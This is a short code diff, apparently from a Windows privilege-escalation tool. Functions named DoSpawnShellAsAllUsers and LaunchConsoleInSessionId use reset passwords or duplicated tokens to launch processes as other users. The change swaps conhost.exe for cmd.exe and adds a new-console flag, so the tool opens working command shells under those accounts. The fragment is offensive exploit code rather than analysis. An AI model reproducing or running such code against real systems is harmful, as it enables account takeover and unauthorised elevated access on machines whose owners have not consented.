@@ -2803,7 +2803,7 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 
 				STARTUPINFO si = { 0 };
 				PROCESS_INFORMATION pi = { 0 };
-				if (!CreateProcessWithLogonW(username, NULL, newpassword_unistr, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\conhost.exe", NULL, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi))
+				if (!CreateProcessWithLogonW(username, NULL, newpassword_unistr, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi))
 				{
 					printf("    Shell : Error %d\n", GetLastError());
 				}
@@ -2885,7 +2885,7 @@ void LaunchConsoleInSessionId(DWORD sessionid)
 
 	STARTUPINFO si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
-	CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+	CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
 
 	CloseHandle(hnewtoken);
 
